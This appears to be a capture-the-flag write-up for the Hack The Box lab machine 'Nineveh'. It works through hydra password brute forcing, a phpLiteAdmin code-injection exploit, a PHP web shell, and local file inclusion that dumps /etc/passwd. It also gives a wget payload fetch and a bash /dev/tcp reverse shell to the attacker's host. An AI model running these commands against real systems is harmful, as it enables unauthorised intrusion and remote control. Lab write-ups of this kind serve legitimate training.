## HTTP

![[front_page.png]]

directory brute forcing:

```txt
gobuster dir -u http://10.10.10.43 -w /usr/share/wordlists/dirb/big.txt -o /HTB-boxes/Ninevah/2-enum/web/gob_dir.md
```

```txt
/department           (Status: 301) [Size: 315] [--> http://10.10.10.43/department/]
```

We find a login panel:

```txt
http://nineveh.htb/department/login.php
```

![[login-page.png]]

Using the credentials *admin:admin*, we are able to see that we only input an invalid password.

![[invalid_pass.png]]


Using BurpSuite, we can see the paramaters for the login form and get the response for inputting an invalid password.

![[burp_invalid_post.png]]

We can now craft a command to use hydra to brute force the login.

```txt
hydra 10.10.10.43 -l admin -P /usr/share/wordlists/rockyou.txt -e nsr -o /HTB-boxes/Ninevah/2-enum/http/hydra_http_host.md http-form-post "/department/login.php:username=^USER^&password=^PASS^:Invalid Password" -t 10
```


```txt
[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
```


![[hydra_success_http.png]]

```txt
http://nineveh.htb/department/manage.php
```

![[http_page1.png]]

```txt
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt
```

![[http_page2.png]]

Secret message:

```txt
-   Have you fixed the login page yet! hardcoded username and password is really bad idea!
-   check your serect folder to get in! figure it out! this is your challenge
-   Improve the db interface.
    ~amrois
```

**Possible user**: *amoris*


```txt
http://nineveh.htb/info.php
```




## HTTPS

```txt
https://nineveh.htb/db/index.php
```

![[https_login.png]]


warning:

```txt
**Warning**: rand() expects parameter 2 to be integer, float given in **/var/www/ssl/db/index.php** on line **114**
```


Using BurpSuite, we can see the paramaters for the login form and get the response for inputting an invalid password for the newly found https website.

![[burp_https_login.png]]

We can now craft a new command to use hydra to brute force the new login.

```txt
hydra 10.10.10.43 -l none -P /usr/share/wordlists/rockyou.txt -e nsr https-form-post "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect password." -t 10 -o /HTB-boxes/Ninevah/2-enum/http/hydra_https_ip.md
```


```txt
[443][http-post-form] host: 10.10.10.43   login: none   password: password123
```

![[hydra_https_success.png]]

we can login to the *phpLiteAdmin* page.

```txt
https://nineveh.htb/db/index.php
```

![[https_admin_page.png]]

```txt
searchsploit php Lite Admin v1.9
```


![[look_for_vulns_https.png]]


```txt
searchsploit -m php/webapps/24044.txt
```

![[xp_url.png]]


generate reverse shell:

```bash
msfvenom -p php/reverse_php LHOST=10.10.14.4 LPORT=4321 -f raw -o revshell.php
```

spin up an http server to host the file:

```bash
python3 -m http.server 80
```

- create a new database with *.php* at the end of the name
![[create_database.png]]
- create a new table
![[make_new_table.png]]
- create a new field with php code as the default value
	- in this case, the php code will download the reverse shell from the attacker machine
![[make_new_field.png]]

php code used:

```php
<?php system("wget 10.10.14.4/php-reverse-shell.php -O /tmp/shell.php;php /tmp/shell.php"); ?>
```

LFI

```txt
http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../var/tmp/dev.php&cmd=id
```


```php
<?php system($_REQUEST["cmd"]); ?>
```

![[create_table_success.png]]

```txt
http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../var/tmp/dev.php&cmd=id
```


```txt
http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../../../../../etc/passwd
```


/etc/passwd

```txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:108:112::/var/run/dbus:/bin/false
uuidd:x:109:113::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
amrois:x:1000:1000:,,,:/home/amrois:/bin/bash
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
```


netcat listener
```bash
nc -lvnp 4321
```

```txt
http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../var/tmp/dev.php&cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.4/4321 0>%261'
```

![[pop_shell.png]]

we can upgrade our shell by running the following command: 

```python
python3 -c 'import pty;pty.spawn("bash")'
```

![[pimp_shell.png]]

